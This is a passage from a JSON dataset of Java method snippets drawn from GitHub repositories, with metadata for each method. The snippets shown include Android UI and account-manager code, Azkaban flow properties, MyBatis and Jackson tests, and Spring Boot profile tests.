"https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 30665, "method_name": "showErrorAlert", "class_name": "QueryYouTubeTask", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void showErrorAlert() {\n            try {\n                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(TrailerPlayerActivity.this);\n                alertDialogBuilder.setTitle(R.string.comm_error);\n                alertDialogBuilder.setCancelable(false);\n                alertDialogBuilder.setMessage(R.string.comm_message);\n\n                alertDialogBuilder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        TrailerPlayerActivity.this.finish();\n                    }\n                });\n\n                AlertDialog lDialog = alertDialogBuilder.create();\n                lDialog.show();\n            } catch (Exception e) {\n                Log.e(this.getClass().getSimpleName(), \"Problem showing error dialog.\", e);\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 30666, "method_name": "onProgressUpdate", "class_name": "QueryYouTubeTask", "params": ["Void"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void onProgressUpdate(Void... pValues) {\n            super.onProgressUpdate(pValues);\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 30667, "method_name": "fromObject", "class_name": "FlowProps", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "FlowProps", "snippet": "  public static FlowProps fromObject(final Object obj) {\n    final Map<String, Object> flowMap = (Map<String, Object>) obj;\n    final String source = (String) flowMap.get(\"source\");\n    final String parentSource = (String) flowMap.get(\"inherits\");\n\n    final FlowProps flowProps = new FlowProps(parentSource, source);\n    return flowProps;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30668, "method_name": "getProps", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getProps() {\n    return this.props;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30669, "method_name": "setProps", "class_name": "FlowProps", "params": ["Props"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setProps(final Props props) {\n    this.props = props;\n    this.parentSource =\n        props.getParent() == null ? null : props.getParent().getSource();\n    this.propSource = props.getSource();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30670, "method_name": "getSource", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSource() {\n    return this.propSource;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30671, "method_name": "getInheritedSource", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getInheritedSource() {\n    return this.parentSource;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30672, "method_name": "toObject", "class_name": "FlowProps", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object toObject() {\n    final HashMap<String, Object> obj = new HashMap<>();\n    obj.put(\"source\", this.propSource);\n    if (this.parentSource != null) {\n      obj.put(\"inherits\", this.parentSource);\n    }\n    return obj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/flow/FlowProps.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30673, "method_name": "shouldSetParameter", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    TYPE_HANDLER.setParameter(ps, 1, LOCAL_TIME, null);\n    verify(ps).setObject(1, LOCAL_TIME);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 30674, "method_name": "shouldGetResultFromResultSetByName", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    when(rs.getObject(\"column\", LocalTime.class)).thenReturn(LOCAL_TIME);\n    assertEquals(LOCAL_TIME, TYPE_HANDLER.getResult(rs, \"column\"));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 30675, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    when(rs.getObject(\"column\", LocalTime.class)).thenReturn(null);\n    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 30676, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    when(rs.getObject(1, LocalTime.class)).thenReturn(LOCAL_TIME);\n    assertEquals(LOCAL_TIME, TYPE_HANDLER.getResult(rs, 1));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 30677, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    when(rs.getObject(1, LocalTime.class)).thenReturn(null);\n    assertNull(TYPE_HANDLER.getResult(rs, 1));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 30678, "method_name": "shouldGetResultFromCallableStatement", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    when(cs.getObject(1, LocalTime.class)).thenReturn(LOCAL_TIME);\n    assertEquals(LOCAL_TIME, TYPE_HANDLER.getResult(cs, 1));\n    verify(cs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 30679, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    when(cs.getObject(1, LocalTime.class)).thenReturn(null);\n    assertNull(TYPE_HANDLER.getResult(cs, 1));\n    verify(cs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 30680, "method_name": "shouldWriteValueAsString", "class_name": "JacksonUtilTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shouldWriteValueAsString() {\n        //given\n        Map<String, String> map = new HashMap<>();\n        map.put(\"aaa\", \"111\");\n        map.put(\"bbb\", \"222\");\n\n        //when\n        String json = JacksonUtil.writeValueAsString(map);\n\n        //then\n        assertThat(json, is(\"{\\\"aaa\\\":\\\"111\\\",\\\"bbb\\\":\\\"222\\\"}\"));\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/avon/rga/core/util/JacksonUtilTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30681, "method_name": "shouldReadValueAsObject", "class_name": "JacksonUtilTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shouldReadValueAsObject() {\n        //given\n        String jsonString = \"{\\\"aaa\\\":\\\"111\\\",\\\"bbb\\\":\\\"222\\\"}\";\n\n        //when\n        Map result = JacksonUtil.readValue(jsonString, Map.class);\n\n        //then\n        assertThat(result.get(\"aaa\"), Is.<Object>is(\"111\"));\n        assertThat(result.get(\"bbb\"), Is.<Object>is(\"222\"));\n\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/avon/rga/core/util/JacksonUtilTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30682, "method_name": "cleanUp", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid cleanUp() {\n\t\tif (this.context != null) {\n\t\t\tthis.context.close();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30683, "method_name": "enableProfileViaApplicationProperties", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid enableProfileViaApplicationProperties() {\n\t\t// gh-308\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tthis.context = application.run(\"--spring.config.name=enableprofileviaapplicationproperties\",\n\t\t\t\t\"--spring.profiles.active=dev\");\n\t\tassertThat(this.context.getEnvironment().acceptsProfiles(Profiles.of(\"dev\"))).isTrue();\n\t\tassertThat(this.context.getEnvironment().acceptsProfiles(Profiles.of(\"a\"))).isTrue();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30684, "method_name": "activeProfilesWithYamlAndCommandLine", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlAndCommandLine() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=B\");\n\t\tassertVersionProperty(this.context, \"B\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30685, "method_name": "activeProfilesWithYamlOnly", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlOnly() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName);\n\t\tassertVersionProperty(this.context, \"B\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30686, "method_name": "orderActiveProfilesWithYamlOnly", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid orderActiveProfilesWithYamlOnly() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-ordered\";\n\t\tthis.context = application.run(configName);\n\t\tassertVersionProperty(this.context, \"B\", \"A\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30687, "method_name": "commandLineBeatsProfilesWithYaml", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid commandLineBeatsProfilesWithYaml() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C\");\n\t\tassertVersionProperty(this.context, \"C\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30688, "method_name": "orderProfilesWithYaml", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid orderProfilesWithYaml() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=A,C\");\n\t\tassertVersionProperty(this.context, \"C\", \"A\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30689, "method_name": "reverseOrderOfProfilesWithYaml", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid reverseOrderOfProfilesWithYaml() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C,A\");\n\t\tassertVersionProperty(this.context, \"A\", \"C\", \"A\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30690, "method_name": "activeProfilesWithYamlAndCommandLineAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlAndCommandLineAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=B\");\n\t\tassertVersionProperty(this.context, \"B\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30691, "method_name": "activeProfilesWithYamlOnlyAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlOnlyAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName);\n\t\tassertVersionProperty(this.context, null);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30692, "method_name": "commandLineBeatsProfilesWithYamlAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid commandLineBeatsProfilesWithYamlAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C\");\n\t\tassertVersionProperty(this.context, \"C\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30693, "method_name": "orderProfilesWithYamlAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid orderProfilesWithYamlAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=A,C\");\n\t\tassertVersionProperty(this.context, \"C\", \"A\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30694, "method_name": "reverseOrderOfProfilesWithYamlAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid reverseOrderOfProfilesWithYamlAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C,A\");\n\t\tassertVersionProperty(this.context, \"A\", \"C\", \"A\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30695, "method_name": "assertVersionProperty", "class_name": "ReproTests", "params": ["ConfigurableApplicationContext", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void assertVersionProperty(ConfigurableApplicationContext context, String expectedVersion,\n\t\t\tString... expectedActiveProfiles) {\n\t\tassertThat(context.getEnvironment().getActiveProfiles()).isEqualTo(expectedActiveProfiles);\n\t\tassertThat(context.getEnvironment().getProperty(\"version\")).as(\"version mismatch\").isEqualTo(expectedVersion);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30696, "method_name": "authenticatorMissing", "class_name": "DatabaseAccountManager", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "Bundle", "snippet": "    private static Bundle authenticatorMissing(String accountType) {\n        Bundle result = new Bundle();\n        result.putInt(KEY_ERROR_CODE, ERROR_CODE_BAD_ARGUMENTS);\n        result.putString(KEY_ERROR_MESSAGE, \"unknown account type: \" + accountType);\n        return result;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30697, "method_name": "getAuthenticator", "class_name": "DatabaseAccountManager", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "DatabaseAuthenticator", "snippet": "    private DatabaseAuthenticator getAuthenticator(String type) {\n        DatabaseAuthenticator authenticator = mAuthenticators.get(type);\n        if (authenticator != null && SDK <= authenticator.getMaxSdkVersion()) {\n            return authenticator;\n        } else {\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30698, "method_name": "getAccountsByType", "class_name": "DatabaseAccountManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Account", "snippet": "    public Account[] getAccountsByType(String type) {\n        DatabaseAuthenticator authenticator = getAuthenticator(type);\n        if (authenticator != null) {\n            return authenticator.getAccountsByType(type);\n        } else if (mStandardAccountManager != null) {\n            return mStandardAccountManager.getAccountsByType(type);\n        } else {\n            return new Account[0];\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30699, "method_name": "getAccountsByTypeAndFeatures", "class_name": "DatabaseAccountManager", "params": ["String", "String", "AccountManagerCallback<Account>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Account>", "snippet": "    public AccountManagerFuture<Account[]> getAccountsByTypeAndFeatures(final String type,\n            final String[] features, AccountManagerCallback<Account[]> callback, Handler handler) {\n        final DatabaseAuthenticator authenticator = getAuthenticator(type);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Account[]>(new Callable<Account[]>() {\n                public Account[] call() {\n                    if (authenticator != null) {\n                        return authenticator.getAccountsByTypeAndFeatures(type, features);\n                    } else {\n                        return new Account[0];\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.getAccountsByTypeAndFeatures(type, features, callback,\n                    handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30700, "method_name": "getAuthToken", "class_name": "DatabaseAccountManager", "params": ["Account", "String", "boolean", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public AccountManagerFuture<Bundle> getAuthToken(final Account account,\n            final String authTokenType, boolean notifyAuthFailure,\n            AccountManagerCallback<Bundle> callback, Handler handler) {\n        final DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Bundle>(new Callable<Bundle>() {\n                public Bundle call() {\n                    if (authenticator != null) {\n                        return authenticator.getAuthToken(account, authTokenType, null);\n                    } else {\n                        return authenticatorMissing(account.type);\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.getAuthToken(account, authTokenType, notifyAuthFailure,\n                    callback, handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30701, "method_name": "addAccount", "class_name": "DatabaseAccountManager", "params": ["String", "String", "String", "Bundle", "Void", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public AccountManagerFuture<Bundle> addAccount(final String accountType,\n            final String authTokenType, final String[] requiredFeatures,\n            final Bundle addAccountOptions, Void activity, AccountManagerCallback<Bundle> callback,\n            Handler handler) {\n        if (activity != null) {\n            throw new RuntimeException(\"Activity parameter is not supported\");\n        }\n        final DatabaseAuthenticator authenticator = getAuthenticator(accountType);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Bundle>(new Callable<Bundle>() {\n                public Bundle call() {\n                    if (authenticator != null) {\n                        return authenticator.addAccount(accountType, authTokenType,\n                                requiredFeatures, addAccountOptions);\n                    } else {\n                        return authenticatorMissing(accountType);\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.addAccount(accountType, authTokenType, requiredFeatures,\n                    addAccountOptions, activity, callback, handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30702, "method_name": "addAccountExplicitly", "class_name": "DatabaseAccountManager", "params": ["Account", "String", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean addAccountExplicitly(Account account, String password, Bundle userdata) {\n        DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n        if (authenticator != null) {\n            return authenticator.addAccountExplicitly(account, password, userdata);\n        } else if (mStandardAccountManager != null) {\n            return mStandardAccountManager.addAccountExplicitly(account, password, userdata);\n        } else {\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30703, "method_name": "removeAccount", "class_name": "DatabaseAccountManager", "params": ["Account", "AccountManagerCallback<Boolean>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Boolean>", "snippet": "    public AccountManagerFuture<Boolean> removeAccount(final Account account,\n            AccountManagerCallback<Boolean> callback, Handler handler) {\n        final DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Boolean>(new Callable<Boolean>() {\n                public Boolean call() {\n                    DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n                    if (authenticator != null) {\n                        return authenticator.removeAccount(account);\n                    } else {\n                        return false;\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.removeAccount(account, callback, handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30704, "method_name": "invalidateAuthToken", "class_name": "DatabaseAccountManager", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void invalidateAuthToken(String accountType, String authToken) {\n        DatabaseAuthenticator authenticator = getAuthenticator(accountType);\n        if (authenticator != null) {\n            authenticator.invalidateAuthToken(accountType, authToken);\n        } else if (mStandardAccountManager != null) {\n            mStandardAccountManager.invalidateAuthToken(accountType, authToken);\n        } else {\n            // Do nothing\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 30705, "method_name": "criaCielo", "class_name": "ProcessadoresPagamentoFactory", "params": ["AutorizadorDeTransacoes"], "throws": null, "modifiers": ["public"], "return_type": "ProcessadorPagamento", "snippet": "\tpublic ProcessadorPagamento criaCielo(AutorizadorDeTransacoes autorizadorDeTransacoes) {\n\t\treturn new ProcessadorCielo(autorizadorDeTransacoes); \n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/ProcessadoresPagamentoFactory.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30706, "method_name": "criaRede", "class_name": 